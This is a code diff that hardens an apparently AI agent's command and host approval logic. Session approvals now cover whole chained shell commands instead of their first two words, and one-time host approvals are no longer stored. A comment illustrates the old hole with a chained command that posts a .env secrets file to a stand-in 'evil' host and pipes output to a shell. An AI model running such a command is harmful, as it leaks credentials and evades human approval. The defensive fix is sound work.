@@ -104,8 +104,9 @@ export function decide(callId, decision) {
   clearTimeout(entry.timer);
   const d = VALID_DECISIONS.has(decision) ? decision : 'rejected'; // 非法值 = denied
   if (d === 'always-session') {
-    // 本会话总是允许：记录参数模式（run_command 记命令前缀，其余工具记原样摘要）
-    const pattern = entry.target ?? (entry.tool === 'run_command' ? commandPrefix(entry.summary) : entry.summary);
+    // 本会话总是允许：记录参数模式（run_command 复合命令记整条，单段记命令前缀；
+    // 其余工具记原样摘要）。工具层会传 target=审批模式，优先用它。
+    const pattern = entry.target ?? (entry.tool === 'run_command' ? approvalPatternFor(entry.summary) : entry.summary);
     const key = scopeKey(entry.tool, entry.scope);
     let set = sessionAllows.get(key);
     if (!set) { set = new Set(); sessionAllows.set(key, set); }
@@ -154,6 +155,23 @@ export function sessionAllowed(tool, pattern, scope = {}) {
 export function commandPrefix(cmd) {
   return String(cmd || '').trim().split(/\s+/).filter(Boolean).slice(0, 2)
     .map((token) => token.toLowerCase()).join(' ');
+}
+
+const SHELL_SPLIT = /\|\||&&|\||;|&|\r?\n/;
+
+/**
+ * 审批参数模式（run_command 专用）：
+ * 单段命令仍用「前两个 token」前缀；一旦命令里出现 shell 连接符（&& || | ; & 换行），
+ * 就改用整条归一化命令 —— 否则「本会话允许 git status」会把
+ * `git status && curl -d @.env https://evil… | sh` 一并放行。
+ */
+export function approvalPatternFor(cmd) {
+  const raw = String(cmd || '').trim();
+  if (!raw) return '';
+  // 先用原始文本切段（换行也是分段符），再逐段收紧空白，最后用固定分隔符拼成规范形
+  const segments = raw.split(SHELL_SPLIT).map((s) => s.trim().replace(/\s+/g, ' ')).filter(Boolean);
+  if (segments.length > 1) return segments.join(' ; ');
+  return commandPrefix(segments[0] || '');
 }
 
 // ---- 主机台账 ----
@@ -220,7 +238,8 @@ export async function ensureHostAuthorized(urlStr, { approvalFn = null, scope = 
   if (decision !== 'allowed-once' && decision !== 'always-session') {
     return { ok: false, host, error: t('用户未授权动态测试目标：{host}', { host }) };
   }
-  confirmHost(host);
+  // 只有「本会话总是允许」才落主机台账；「仅这一次」不落，否则下一次探测会静默免审
+  if (decision === 'always-session') confirmHost(host);
   return { ok: true, host, url: u.toString() };
 }
 
